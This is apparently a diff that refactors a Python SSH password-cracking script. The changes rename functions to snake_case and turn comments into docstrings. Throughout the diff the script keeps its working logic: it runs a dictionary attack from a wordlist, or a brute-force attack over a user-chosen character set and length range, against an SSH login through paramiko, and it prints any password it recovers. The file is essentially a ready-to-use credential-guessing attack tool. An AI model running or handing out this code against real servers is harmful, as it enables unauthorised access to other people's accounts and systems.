@@ -14,8 +14,10 @@ parser.add_argument('-max', '--maximum', default=10, type=int, help='Maximum len
 
 args = parser.parse_args()
 
-# if no port is entered by user, then the host is args.server and the port 80 will be used
-# otherwise host and port will be set by function "checkServerString()"
+"""
+if no port is entered by user, then the host is args.server and the port 80 will be used
+otherwise host and port will be set by function "checkServerString()"
+"""
 user = args.username
 server = args.server
 host = server             
@@ -23,16 +25,24 @@ port = 80
 wordlist = args.wordlist
 character = args.character
 
-def checkServerString():
-    # checks if port is entered by user after the ip adress with ":"
+def check_server_string():
+    """
+    Checks if the user typed the port after the ip addres with ":".
+    If this is true, the global variables will be overwritten.
+    """
     global server, host, port
     if ":" in server:
         server = args.server.split(":")
         host = server[0]
         port = int(server[1])
 
-def defineCharset():
-    # defines the charset for bruteforce attack based on user input
+def define_charset() -> str:
+    """
+    Creates the characterset for bruteforce attack based on user input.
+
+    Returns:
+    str: Characterset
+    """
     charSet = ''
     if args.character:
         if "A" in character:
@@ -43,11 +53,21 @@ def defineCharset():
             charSet += string.digits
         if "!" in character:
             charSet += string.punctuation
-    else: charSet = string.ascii_letters + string.digits + string.punctuation
+    else: 
+        charSet = string.ascii_letters + string.digits + string.punctuation
     return charSet
 
-def sshConnect(pwd: str):
-    # connects with the host using ssh
+def ssh_connect(pwd: str) -> bool:
+    """
+    Connects to host by using ssh and returns true or false
+    depending on the result of connection attempt.
+
+    Parameters:
+    pwd (str): Password for connection attempt
+
+    Returns:
+    bool: True, if connection was established or false, if not.
+    """
     ssh = SSHClient()
     ssh.set_missing_host_key_policy(AutoAddPolicy())
     established = False
@@ -62,40 +82,51 @@ def sshConnect(pwd: str):
         ssh.close()
         return established
 
-def tryToConnect(pwd: str):
-    # checks if connection could be established
+def try_to_connect(pwd: str):
+    """
+    Checks if the connection could be established and
+    prints the valid password of the user.
+
+    Parameters:
+    pwd (str): Password for connection attempt
+    """
     try:
-        if sshConnect(pwd) == True:
+        if ssh_connect(pwd) == True:
             print(f'The password of user \'{user}\' is \'{pwd}\'!')
             exit()
     except Exception as e:
             print(e)
 
-def dictionaryAttack():
-    # reads single passwords of the wordlist and tries to connect
+def dictionary_attack():
+    """
+    Reads single passwords of the wordlist and tries to connect.
+    """
     with open(wordlist, 'r') as list:
         for password in list.readlines():
             pwd = password.strip()
-            tryToConnect(pwd)
+            try_to_connect(pwd)
         print(f'Password not found. Please try another wordlist.')
       
-def bruteForceAttack():
-    # forces the password with defined charset and length
-    charSet = defineCharset()
+def bruteforce_attack():
+    """
+    Executes the brutforce attack with characterset and length of password 
+    defined by user and tries to connect.
+    """
+    charSet = define_charset()
     minLength = args.minimum
     maxLength = args.maximum
 
     for n in range (minLength, maxLength + 1):
         for password in product(charSet, repeat=n):
             pwd = "".join(password)
-            tryToConnect(pwd)
+            try_to_connect(pwd)
     print(f'Password not found. Please adjust the characters and the min and max length.')
 
 
 if __name__ == "__main__":
-    checkServerString()
+    check_server_string()
 
     if wordlist:
-        dictionaryAttack()
+        dictionary_attack()
     else:
-        bruteForceAttack()
+        bruteforce_attack()
